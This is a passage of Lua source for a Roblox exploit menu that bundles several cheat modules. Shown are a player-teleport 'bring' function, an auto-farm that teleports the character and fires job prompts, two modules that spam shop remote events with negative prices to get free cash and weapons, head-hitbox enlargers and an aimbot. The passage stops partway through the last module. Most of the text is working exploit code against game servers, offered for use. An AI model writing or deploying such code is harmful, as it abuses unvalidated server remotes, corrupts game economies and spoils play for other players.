				local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
				local myHRP = myChar:FindFirstChild("HumanoidRootPart")
				if targetHRP and myHRP then
					targetHRP.CFrame = myHRP.CFrame + Vector3.new(2, 0, 0)
				end
			end
		end)
	else
		isBringing = false
		bringButton.Text = "Bring Player"
		if bringConnection then bringConnection:Disconnect() end
	end
end)

friendButton.MouseButton1Click:Connect(function()
	if selectedPlayer then
		LocalPlayer:RequestFriendship(selectedPlayer)
	end
end)

-- Keep health label updated
RunService.Heartbeat:Connect(function()
	if selectedPlayer then
		local humanoid = selectedPlayer.Character and selectedPlayer.Character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
		else
			healthLabel.Text = "Health: N/A"
		end
	end
end)

Players.PlayerRemoving:Connect(function(plr)
	if plr == selectedPlayer then
		selectedPlayer = nil
		nameLabel.Text = "Name: None"
		healthLabel.Text = "Health: N/A"
		if isViewing then revertCamera() end
	end
	refreshPlayerList()
end)

Players.PlayerAdded:Connect(function()
	refreshPlayerList()
end)

refreshPlayerList()
end)

--// Function to Add Buttons to Main Menu
local function addMainMenuButton(text, callback)
	local panel = tabPanels["MONSY MENU"]
	if not panel then return end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 36)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamSemibold
	button.TextSize = 14
	button.Text = text
	button.AutoButtonColor = false
	button.Parent = panel
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)

	button.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("FPS BOOST CARTOON [3KTG]", function()
	--// FPS BOOST + CARTOON STYLE (ALL BLACK GUI VERSION)
-- Black Frame + Black Button + White Text + Rounded Corners

--// Services
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

--// GUI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Button = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local BtnCorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")

ScreenGui.Name = "FPSBoostCartoon"
ScreenGui.Parent = game.CoreGui

-- Main Frame
Frame.Size = UDim2.new(0, 220, 0, 120)
Frame.Position = UDim2.new(0.4, 0, 0.3, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0.2
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Frame

-- Title
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "FPS BOOST"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = Frame

-- Button
Button.Size = UDim2.new(1, -40, 0, 40)
Button.Position = UDim2.new(0, 20, 0, 60)
Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black button
Button.TextColor3 = Color3.fromRGB(255, 255, 255) -- white text
Button.Font = Enum.Font.GothamBold
Button.TextSize = 18
Button.Text = "ENABLE CARTOON"
Button.Parent = Frame

BtnCorner.CornerRadius = UDim.new(0, 6)
BtnCorner.Parent = Button

UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Parent = Button

--// State
local BoostEnabled = false

--// Functions
local function applyCartoon()
	-- Lighting tweaks
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 100000
	Lighting.Brightness = 2
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0
	Lighting.Ambient = Color3.fromRGB(255, 255, 255)
	Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)

	-- Remove sky + effects
	for _, v in ipairs(Lighting:GetChildren()) do
		if v:IsA("Sky") then
			v:Destroy()
		elseif v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") then
			v.Enabled = false
		end
	end

	-- Cartoonify objects
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("Part") or obj:IsA("MeshPart") then
			obj.Material = Enum.Material.SmoothPlastic
			obj.Reflectance = 0
		elseif obj:IsA("Decal") or obj:IsA("Texture") then
			obj:Destroy()
		end
	end

	-- Apply sa bagong spawn characters
	Players.PlayerAdded:Connect(function(player)
		player.CharacterAdded:Connect(function(char)
			task.wait(1)
			for _, obj in ipairs(char:GetDescendants()) do
				if obj:IsA("Part") or obj:IsA("MeshPart") then
					obj.Material = Enum.Material.SmoothPlastic
					obj.Reflectance = 0
				elseif obj:IsA("Decal") or obj:IsA("Texture") then
					obj:Destroy()
				end
			end
		end)
	end)
end

local function resetGraphics()
	-- Default lighting reset
	Lighting.GlobalShadows = true
	Lighting.Brightness = 3
	Lighting.FogEnd = 100000
	Lighting.Ambient = Color3.fromRGB(128, 128, 128)
	Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)

	-- Enable effects back
	for _, v in ipairs(Lighting:GetChildren()) do
		if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") then
			v.Enabled = true
		end
	end
end

--// Toggle
Button.MouseButton1Click:Connect(function()
	BoostEnabled = not BoostEnabled
	if BoostEnabled then
		applyCartoon()
		Button.Text = "DISABLE CARTOON"
	else
		resetGraphics()
		Button.Text = "ENABLE CARTOON"
	end
end)
end)

addMainMenuButton("AUTO FARM [3KTG]", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")

local DeliveryJob = workspace:WaitForChild("DeliveryJob"):WaitForChild("BoxPickingJob")
local pickupPrompt = DeliveryJob:WaitForChild("PickupBox"):WaitForChild("PickupPrompt")
local dropPrompt = DeliveryJob:WaitForChild("Job"):WaitForChild("Part"):WaitForChild("ProximityPrompt")

-- GUI Creation
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = player:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 200, 0, 90)
MainFrame.Position = UDim2.new(0.5, -100, 0.75, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local UICornerFrame = Instance.new("UICorner")
UICornerFrame.CornerRadius = UDim.new(0, 8)
UICornerFrame.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 0, 30)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.SourceSansBold
TitleLabel.TextSize = 18
TitleLabel.Text = "AUTO FARM BOX"
TitleLabel.Parent = MainFrame

local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(1, -20, 0, 40)
ToggleButton.Position = UDim2.new(0, 10, 0, 40)
ToggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.TextSize = 20
ToggleButton.Text = "Auto Farm : OFF"
ToggleButton.Parent = MainFrame
ToggleButton.Active = true

local UICornerButton = Instance.new("UICorner")
UICornerButton.CornerRadius = UDim.new(0, 8)
UICornerButton.Parent = ToggleButton

-- Script Logic
local running = false

-- Instant walk function (teleport close enough, no tween)
local function walkToInstant(part)
    local goalCFrame = part.CFrame + Vector3.new(0, 0, -3)
    hrp.CFrame = goalCFrame
end

local function activatePrompt(prompt)
    walkToInstant(prompt.Parent)
    task.wait(0.2)

    if prompt:FindFirstChild("PromptButtonHoldBegan") then
        prompt.PromptButtonHoldBegan:Fire()
        task.wait(1.4) -- Fixed hold duration
        prompt.PromptButtonHoldEnded:Fire()
    else
        if fireproximityprompt then
            fireproximityprompt(prompt)
        else
            warn("Can't trigger prompt!")
        end
    end
end

-- Toggle button click event
ToggleButton.MouseButton1Click:Connect(function()
    running = not running
    if running then
        ToggleButton.Text = "Auto Farm: ON"
        -- Start the loop
        spawn(function()
            while running do
                repeat task.wait(0.4) until pickupPrompt.Enabled and running
                if not running then break end

                activatePrompt(pickupPrompt)
                if not running then break end

                activatePrompt(dropPrompt)
                if not running then break end

                task.wait(0.8)
            end
        end)
    else
        ToggleButton.Text = "Auto Farm: OFF"
    end
end)
end)

addMainMenuButton("LASPINAS SYSTEM [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "LAS PINAS ROLEPLAY"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Heavy Vest", "Heavy Vest"},
    {"Glock-19", "Glock-19"},
    {"Oxy", "Oxy"},
    {"Vector", "Vector"},
    {"Tail", "Tail"},
    {"AmmoBox", "AmmoBox"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.ShopRemotes["BuyItem_67c0c0a9-879c-4502-812a-a346fcb4963a"]:FireServer(selectedItem, -100000)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(0.001)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("VENERAL CITY RP [3KTG]", function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "TAONG GOMA VENERAL ROLEPLAY"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Glock-17", "Desert Eagle", "AmmoBox", "Oxy", "HK416", "UZI"}

local selectedGun = nil

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") 

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (TAONG GOMA CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("ADJUSTABLE BIG HEAD [3KTG]", function()
   --// CONFIG
_G.HeadSize = 1 -- Start at 1x size
_G.Disabled = true -- Start disabled

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

--// ORIGINAL STORAGE
local OriginalSizes = {}
local OriginalTrans = {}
local OriginalBrickColor = {}
local OriginalMaterial = {}
local OriginalCanCollide = {}
local OriginalMassless = {}

--// APPLY FUNCTION
local function updateHead(head, player)
    if head and player ~= LocalPlayer then
        local key = player
        if not OriginalSizes[key] then
            OriginalSizes[key] = head.Size
            OriginalTrans[key] = head.Transparency
            OriginalBrickColor[key] = head.BrickColor
            OriginalMaterial[key] = head.Material
            OriginalCanCollide[key] = head.CanCollide
            OriginalMassless[key] = head.Massless
        end
        if not _G.Disabled then
            head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
            head.Transparency = 0.4
            head.BrickColor = BrickColor.new("Red")
            head.Material = Enum.Material.Neon
            head.CanCollide = false
            head.Massless = true
        else
            -- Restore original properties when disabled
            head.Size = OriginalSizes[key]
            head.Transparency = OriginalTrans[key]
            head.BrickColor = OriginalBrickColor[key]
            head.Material = OriginalMaterial[key]
            head.CanCollide = OriginalCanCollide[key]
            head.Massless = OriginalMassless[key]
        end
    end
end

--// UPDATE LOOP
RunService.RenderStepped:Connect(function()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                pcall(function()
                    updateHead(head, player)
                end)
            end
        end
    end
end)

--// INITIAL AND CONNECTIONS
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                updateHead(head, player)
            end
        end
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local SizeLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 140)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "BIG HEAD SCRIPT"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0, 0, 1, 0) -- Initial for 1x ( (1-1)/9 = 0 )
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10) -- Initial for 1x
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = SliderBack

-- Size text display
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.45, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
SizeLabel.TextSize = 14
SizeLabel.Font = Enum.Font.SourceSans
SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
SizeLabel.Parent = Frame

-- Toggle button for Enable/Disable
ToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black
ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0) -- Black border
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "Disabled: On"
ToggleButton.Parent = Frame

-- Size slider logic
local dragging = false

local function updateSize(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newSize = 1 + percent * 9  -- 1 to 10 range
    _G.HeadSize = newSize
    SizeLabel.Text = "Size: " .. string.format("%.1f", newSize)
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local mousePos = UIS:GetMouseLocation()
        local percent = (mousePos.X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateSize(percent)
    end
end)

-- Toggle Enable/Disable
ToggleButton.MouseButton1Click:Connect(function()
    _G.Disabled = not _G.Disabled
    if _G.Disabled then
        ToggleButton.Text = "Disabled: On"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black
        ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0) -- Black border
    else
        ToggleButton.Text = "Disabled: Off"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black
        ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0) -- Black border
    end
end)

-- Initial setup
updateSize((_G.HeadSize - 1) / 9)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PERSONAL VASCO [PABLOVASCO]", function()
	--// CONFIG
_G.HeadSize = 1 -- Start at 1x size
_G.Disabled = true -- Start disabled for big head
_G.AimEnabled = false -- Start disabled for aimbot
_G.Smoothness = 1 -- Lower value for smoother aimbot tracking
_G.AimbotMode = "Instant" -- Options: "Instant", "Smooth"
_G.FOV = 4 -- Field of View in degrees

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local Mouse = LocalPlayer:GetMouse()
local Camera = workspace.CurrentCamera

--// ORIGINAL STORAGE
local OriginalSizes = {}
local OriginalTrans = {}
local OriginalBrickColor = {}
local OriginalMaterial = {}
local OriginalCanCollide = {}
local OriginalMassless = {}

--// HEAD SIZE FUNCTIONS
local function updateHead(head, player)
    if head and player ~= LocalPlayer then
        local key = player
        if not OriginalSizes[key] then
            OriginalSizes[key] = head.Size
            OriginalTrans[key] = head.Transparency
            OriginalBrickColor[key] = head.BrickColor
            OriginalMaterial[key] = head.Material
            OriginalCanCollide[key] = head.CanCollide
            OriginalMassless[key] = head.Massless
        end
        if not _G.Disabled then
            head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
            head.Transparency = 1 -- Fully invisible
            head.BrickColor = BrickColor.new("Red")
            head.Material = Enum.Material.Neon
            head.CanCollide = false
            head.Massless = true
        else
            -- Restore original properties when disabled
            head.Size = OriginalSizes[key]
            head.Transparency = OriginalTrans[key]
            head.BrickColor = OriginalBrickColor[key]
            head.Material = OriginalMaterial[key]
            head.CanCollide = OriginalCanCollide[key]
            head.Massless = OriginalMassless[key]
        end
    end
end

--// AIMBOT FUNCTIONS
local function getTargetPart(character)
    local head = character:FindFirstChild("Head")
    local neck = character:FindFirstChild("Neck")
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    local upperTorso = character:FindFirstChild("UpperTorso")
    local neckAttachment = upperTorso and upperTorso:FindFirstChild("NeckAttachment")
    if head then
        return head.Position
    elseif neck then
        return neck.CFrame.Position
    elseif neckAttachment then
        return neckAttachment.WorldPosition
    elseif humanoidRootPart then
        return humanoidRootPart.Position
    end
    return nil
end

local function getClosestPlayer()
    local closestTarget = nil
    local shortestDistance = math.huge
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local character = player.Character
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                humanoid.Died:Connect(function()
                    player.Character = player.CharacterAdded:Wait()
                end)
                local targetPos = getTargetPart(character)
                if targetPos then
                    local distance = (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude
                    local screenPoint, onScreen = Camera:WorldToScreenPoint(targetPos)
                    if onScreen then
                        local toTarget = (targetPos - Camera.CFrame.Position).unit
                        local cameraForward = Camera.CFrame.LookVector
                        local angle = math.acos(cameraForward:Dot(toTarget)) * (180 / math.pi)
                        if angle <= _G.FOV and distance < shortestDistance then
                            shortestDistance = distance
                            closestTarget = targetPos
                        end
                    end
                end
            end
        end
    end
    return closestTarget
end

local function aimAtTarget()
    local target = getClosestPlayer()
    if target then
        if _G.AimbotMode == "Instant" then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target)
        elseif _G.AimbotMode == "Smooth" then
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, target), _G.Smoothness)
        end
    end
end

--// UPDATE LOOP
RunService.RenderStepped:Connect(function()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                pcall(function()
                    updateHead(head, player)
                end)
            end
        end
    end
    if _G.AimEnabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        aimAtTarget()
    end
end)

--// INITIAL AND CONNECTIONS
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                updateHead(head, player)
            end
        end
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
